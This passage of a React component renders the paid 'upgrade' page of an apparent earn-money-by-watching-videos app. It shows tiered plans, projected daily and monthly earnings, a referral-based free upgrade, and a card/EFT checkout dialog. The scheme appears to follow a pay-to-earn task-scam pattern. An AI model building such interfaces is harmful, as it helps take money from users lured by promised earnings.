  const perDay = me?.today.limit || Number(config.data?.settings.surveys_per_day ?? 1) || 1;

  return (
    <div className="mx-auto max-w-5xl space-y-6">
      <header className="flex flex-wrap items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <Badge className="bg-money/15 text-money border-money/30">
              <BadgeCheck className="size-3.5 mr-1" /> Account Verified
            </Badge>
          </div>
          <h1 className="font-display text-3xl font-bold">Upgrade your plan</h1>
          <p className="mt-1 text-muted-foreground">
            Watch 5 short videos a day — bigger reward per video and faster payouts.
          </p>
        </div>
        <div className="flex items-center gap-2 rounded-xl border border-border bg-card px-3 py-2 shadow-soft">
          <CreditCard className="size-4 text-primary" />
          <span className="text-xs font-semibold text-foreground">Ghost Pay • Paystack ZAR</span>
        </div>
      </header>

      {config.isLoading ? (
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
          {[0, 1, 2, 3].map((index) => (
            <Skeleton key={index} className="h-72 rounded-2xl" />
          ))}
        </div>
      ) : null}

      <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
        {plans.map((plan) => {
          const isCurrent = plan.tier === currentTier;
          const isDowngrade = tierRank(plan.tier) <= tierRank(currentTier);
          return (
            <Card
              key={plan.tier}
              className={`relative flex flex-col shadow-soft ${
                isCurrent ? "border-primary ring-2 ring-primary" : ""
              }`}
            >
              {isCurrent ? (
                <span className="absolute right-0 top-0 rounded-bl-xl bg-primary px-3 py-1 text-xs font-bold text-primary-foreground">
                  Your plan
                </span>
              ) : null}
              <CardContent className="flex flex-1 flex-col gap-4 p-5">
                <div className="flex items-center gap-2">
                  {plan.tier === "regular" ? (
                    <Sparkles className="size-4 text-primary" />
                  ) : (
                    <Crown className="size-4 text-gold" />
                  )}
                  <h2 className="font-display text-xl font-bold">{plan.name}</h2>
                </div>
                <p className="font-display text-3xl font-extrabold">
                  {Number(plan.price_kes) === 0 ? "Free" : formatKes(plan.price_kes)}
                </p>
                <div className="rounded-xl bg-secondary/70 p-3">
                  <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                    Projected earnings
                  </p>
                  <p className="font-display text-2xl font-bold text-primary">
                    {formatKes(Number(plan.reward_per_survey) * perDay)} / day
                  </p>
                  <p className="text-xs text-muted-foreground">
                    {formatKes(Number(plan.reward_per_survey) * perDay * 30)} per month
                  </p>
                </div>
                <div className="space-y-1 text-sm">
                  <p className="flex items-center gap-2 font-semibold text-primary">
                    <Banknote className="size-4" /> {formatKes(plan.reward_per_survey)} per video
                  </p>
                  <p className="flex items-center gap-2 text-muted-foreground">
                    <Clock className="size-4" /> Payout every {plan.withdrawal_days} day
                    {plan.withdrawal_days === 1 ? "" : "s"}
                  </p>
                </div>
                <ul className="space-y-1.5 text-sm text-muted-foreground">
                  {plan.perks.map((perk) => (
                    <li key={perk} className="flex items-start gap-2">
                      <CheckCircle2 className="mt-0.5 size-4 shrink-0 text-primary" />
                      {perk}
                    </li>
                  ))}
                </ul>
                <div className="mt-auto pt-2">
                  <Button
                    className="w-full"
                    variant={isDowngrade ? "outline" : "default"}
                    disabled={isDowngrade}
                    onClick={() => {
                      setSelected(plan.tier as Tier);
                      setPhone(me?.profile.mpesa_phone ?? me?.profile.phone ?? "");
                    }}
                  >
                    {isCurrent ? "Current plan" : isDowngrade ? "Included" : `Upgrade to ${plan.name}`}
                  </Button>
                </div>
              </CardContent>
            </Card>
          );
        })}
      </div>

      <Card className="bg-secondary/50">
        <CardContent className="flex flex-wrap items-center gap-3 p-5 text-sm text-muted-foreground">
          <Badge variant="secondary">Free option</Badge>
          Invite {me?.settings.referral_target ?? 5} friends who activate their accounts and we
          upgrade you for free — no payment.
        </CardContent>
      </Card>

      <Dialog open={selected !== null} onOpenChange={(open) => !open && setSelected(null)}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 font-display">
              <CreditCard className="size-5 text-primary" /> Pay with Card / Instant EFT (ZAR)
            </DialogTitle>
            <DialogDescription>
              Pay securely via Ghost Pay (Visa, Mastercard, 3-D Secure, and Instant EFT). Your VIP tier activates immediately upon payment confirmation.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3">
            <div className="space-y-1.5">
              <Label htmlFor="upgrade-email" className="flex items-center justify-between text-xs font-semibold">
                <span>Your Email Address</span>
                <span className="text-[10px] text-destructive font-medium">* Required</span>
              </Label>
              <Input
                id="upgrade-email"
                type="email"
                placeholder="e.g. name@gmail.com"
                value={email}
                onChange={(event) => setEmail(event.target.value)}
              />
              <p className="text-[11px] text-muted-foreground">Required for payment authorization & receipt.</p>
            </div>
            <div className="space-y-1.5">
              <Label htmlFor="upgrade-phone" className="text-xs font-semibold">Phone or Account number (Optional)</Label>
              <Input
                id="upgrade-phone"
                inputMode="tel"
                placeholder="e.g. 082 123 4567"
                value={phone}
                onChange={(event) => setPhone(event.target.value)}
              />
            </div>
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setSelected(null)}>
              Cancel
            </Button>
            <Button
              disabled={mutation.isPending || !email.trim() || !email.includes("@")}
              onClick={() => mutation.mutate()}
            >
              {mutation.isPending ? <Loader2 className="mr-2 size-4 animate-spin" /> : null}
              Proceed to Secure Checkout
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
